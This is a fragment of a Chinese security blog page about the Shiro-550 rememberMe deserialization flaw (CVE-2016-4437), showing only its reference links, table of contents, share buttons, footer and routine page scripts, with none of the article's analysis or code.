+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://l3yx.github.io/">https://l3yx.github.io/</a></p>
+<p><a target="_blank" rel="noopener" href="https://payloads.info/2020/06/23/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B">https://payloads.info/2020/06/23/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/">http://www.lmxspace.com/2020/08/24/%E4%B8%80%E7%A7%8D%E5%8F%A6%E7%B1%BB%E7%9A%84shiro%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="toc-number">1.</span> <span class="toc-text">漏洞详情</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">加密流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E6%B5%81%E7%A8%8B"><span class="toc-number">3.2.</span> <span class="toc-text">解密流程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%99%90%E5%88%B6%E3%80%81%E5%9D%91%E7%82%B9%E5%8F%8A%E6%80%9D%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">利用限制、坑点及思考</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-100key-%E8%83%BD%E7%94%A8"><span class="toc-number">5.1.</span> <span class="toc-text">为什么 100key 能用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%9C%89%E7%9A%84%E9%93%BE%E6%89%93%E4%B8%8D%E4%BA%86"><span class="toc-number">5.2.</span> <span class="toc-text">为什么有的链打不了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E4%BC%B8-resovleClass-%E7%9A%84%E6%95%B0%E7%BB%84%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">5.3.</span> <span class="toc-text">延伸 - resovleClass 的数组类加载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JRMP-%E6%94%BB%E5%87%BB"><span class="toc-number">5.4.</span> <span class="toc-text">JRMP 攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%80%9D%E8%80%83"><span class="toc-number">5.5.</span> <span class="toc-text">分析思考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shiro-721-PaddingOracle-CBC-Attack"><span class="toc-number">5.6.</span> <span class="toc-text">Shiro-721 PaddingOracle CBC Attack</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Shiro-550 rememberMe 反序列化漏洞分析&body=Check out this article: http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=Shiro-550 rememberMe 反序列化漏洞分析&description=&lt;p&gt;本篇为 Shiro550 (CVE-2016-4437) 的漏洞复现、分析和学习&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2021 M13n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
